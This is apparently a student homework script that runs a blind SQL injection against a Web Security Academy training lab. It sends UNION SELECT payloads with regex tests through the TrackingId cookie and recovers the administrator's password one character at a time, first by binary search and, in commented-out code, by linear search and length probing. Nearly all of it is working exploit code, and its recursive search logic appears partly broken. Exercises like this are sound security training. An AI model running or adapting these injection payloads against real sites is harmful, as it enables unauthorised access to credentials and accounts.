# Maksim Semchuk
# CS 495 Homework #2


# Needed Imports:
import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
import time
import string

# Functions:
# Step 4: Inital Program:
def try_query(query):
    print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


# This takes in a url (to the site),
# A prefix, that is already know, if any.
# a letter that is being tested to see if it exists inside of the password.
def test_string(url, prefix, letter):
    #query is what is going to be passed in as a regex argument along with the cookie.,
    query = f"x' union select 'a' from users where username = 'administrator' and password ~ '{prefix}{letter}'--"  #removed the ^ from the ^{prefix} , since prefix has that already
    print(f'\nTesting: {prefix}{letter}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query)}

    # Now to test it:
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')

    if soup.find('div', text='Welcome back!'):
        print(f'Found Character {letter}')
        return True
    else:
        return False


def recursive_search(url, administrator_prefix, charset, mid):
    if (len(charset[:mid])!=1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[:mid]}]' --""")):
        administrator_prefix += recursive_search(url, administrator_prefix, charset[:mid], len(charset[:mid])//2)
    elif (len(charset[:mid])!=1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[mid:]}]' --""")):
        administrator_prefix += recursive_search(url, administrator_prefix, charset[mid:], len(charset[mid:])//2)
    
    if (len(charset[:mid])==1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[:mid]}]' --""")):
        administrator_prefix += charset[:mid]
        print(f"administrator_prefix: {administrator_prefix}")
        return administrator_prefix
    if (len(charset[mid:])==1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[mid:]}]' --""")):
        administrator_prefix += charset[mid:]
        print(f"administrator_prefix: {administrator_prefix}")
        return administrator_prefix


def binary_search(url):
    administrator_prefix = ''
    charset = string.ascii_lowercase + string.digits
    mid = len(charset) // 2
    print(try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^[{charset[:mid]}]' --"""))
    print(try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^[{charset[mid:]}]' --"""))
    while True:
        administrator_prefix += recursive_search(url, administrator_prefix, charset, mid)
        if test_string(url, administrator_prefix, '$'):
            return administrator_prefix







# To clean things up
if __name__ == "__main__":
    #site = sys.argv[1]
    site = 'https://ac4d1f6f1f26c6de806067290069006b.web-security-academy.net/'
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')

    url = f'https://{site}/'

    # Step #11: Binary Search:
    admin_password = binary_search(url)
    print(f"Final password is: {admin_password}\n")
























# Step #6: Password Length:
# password_length = find_password_length()

# Step #8: Linear Password search:
# reference_password = linear_search()
# print(f"Password reference password is {reference_password}")

"""
# Step 8: Linear Search:
def linear_search():
    start_alpha = string.ascii_lowercase + string.digits
    prefix = ''
    begin_time = time.perf_counter()
    while True:
        # Test if the current prefix IS the exact password.
        if test_string(url, prefix, '$'):
            break
        # Otherwise, go through the letter list
        for letter in start_alpha:
            check = test_string(url, prefix, letter)
            if check:
                prefix += letter
                break
    print(f"Time elapsed is {time.perf_counter()-begin_time}")
    return prefix
"""

"""
# Step 6: Find the password Length:
def find_password_length():
    # Step 6: Find the password Length:
    begin_time = time.perf_counter()
    num = 1
    while True:
        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
        print(f'Trying length {num}')
        if try_query(query) == False:
            num = num + 1
        else:
            break
    print(f"Password length is {num}")
    print(f"Time elapsed is {time.perf_counter()-begin_time}")
    return num

"""